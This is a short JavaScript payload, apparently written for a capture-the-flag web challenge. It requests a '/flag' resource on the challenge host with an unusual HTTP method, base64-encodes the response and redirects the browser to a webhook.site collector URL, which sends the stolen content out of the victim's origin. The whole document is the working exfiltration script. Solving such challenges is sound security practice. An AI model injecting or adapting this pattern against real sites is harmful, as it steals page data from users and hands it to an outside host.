fetch('https://bugcrowd-feedback-yes-please.chals.io/flag', {
    method: 'TEEHEE'
})
.then(response => response.text())
.then(contents => {
    const webhookUrl = `https://webhook.site/b2827932-b0a6-490a-9be6-5c08830d7453?data=${btoa(contents)}`;
    window.location.href = webhookUrl;
})
.catch(error => console.error('Error:', error));
